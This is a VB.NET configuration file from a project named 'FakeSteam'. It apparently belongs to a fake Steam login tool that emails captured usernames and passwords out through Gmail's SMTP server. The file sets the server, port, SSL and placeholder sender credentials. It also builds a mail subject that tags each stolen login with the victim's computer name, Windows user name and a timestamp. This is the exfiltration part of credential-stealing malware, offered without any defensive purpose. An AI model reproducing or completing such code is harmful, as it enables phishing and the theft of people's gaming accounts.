' ***********************************************************************
' Assembly : FakeSteam
' Author   : Elektro
' Modified : 03-May-2015
' ***********************************************************************
' <copyright file="SmtpConfig.vb" company="Elektro Studios">
'     Copyright (c) Elektro Studios. All rights reserved.
' </copyright>
' ***********************************************************************

#Region " Imports "

Imports System.Net
Imports System.Net.Mail

#End Region

Namespace Config

    Partial Public NotInheritable Class UserConfig

#Region " SMTP Sending Configuration"

        ''' <summary>
        ''' If set to <c>True</c>, enables STMP sending of the username/password.
        ''' </summary>
        Public Shared ReadOnly EnableSmtp As Boolean = False

        ''' <summary>
        ''' The SMTP server.
        ''' </summary>
        Public Shared ReadOnly SmtpServer As New SmtpClient("smtp.gmail.com")

        ''' <summary>
        ''' The SMTP server port.
        ''' </summary>
        Public Shared ReadOnly SmtpPort As Integer = 587

        ''' <summary>
        ''' The SMTP security.
        ''' </summary>
        Public Shared ReadOnly SmtpSslEnabled As Boolean = True

        ''' <summary>
        ''' The mail account address.
        ''' </summary>
        Public Shared ReadOnly MailAddress As New MailAddress("username@gmail.com")

        ''' <summary>
        ''' The mail account username/password credentials.
        ''' </summary>
        Public Shared ReadOnly MailCredentials As New NetworkCredential("username@gmail.com", "password")

        ''' <summary>
        ''' The mail subject.
        ''' By default is "Steam_{ComputerName}_{Username}_{Day}-{Month}-{Year}_{Hour}-{Minute}-{Seconds}"
        ''' </summary>
        Public Shared ReadOnly MailSubject As String =
            String.Format("Steam_{0}_{1}_{2}", Environment.MachineName, Environment.UserName, DateTime.Now.ToString("dd-MM-yyyy\_hh-mm-ss"))

#End Region

    End Class

End Namespace